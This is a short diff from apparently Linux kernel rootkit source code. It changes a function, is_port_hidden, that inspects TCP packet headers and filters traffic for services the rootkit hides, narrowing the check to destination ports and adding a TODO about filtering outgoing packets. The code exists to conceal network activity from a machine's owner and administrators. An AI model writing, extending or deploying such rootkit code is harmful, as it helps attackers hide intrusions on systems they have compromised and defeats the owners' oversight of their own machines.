@@ -53,8 +53,8 @@ is_port_hidden (struct sk_buff *skb)
 			tcp_header = (struct tcphdr *) skb_transport_header(skb);
 			
 			/* check with the control API if this service is hidden */
-			if (is_service_hidden(ntohs(tcp_header->source))
-					|| is_service_hidden(ntohs(tcp_header->dest))) {
+			// TODO: find a way to also filter outgoing packets
+			if (is_service_hidden(ntohs(tcp_header->dest))) {
 				
 				ROOTKIT_DEBUG("Filtered TCP packet detected. Src: %u Dest: %u\n", ntohs(tcp_header->source), ntohs(tcp_header->dest));
 			
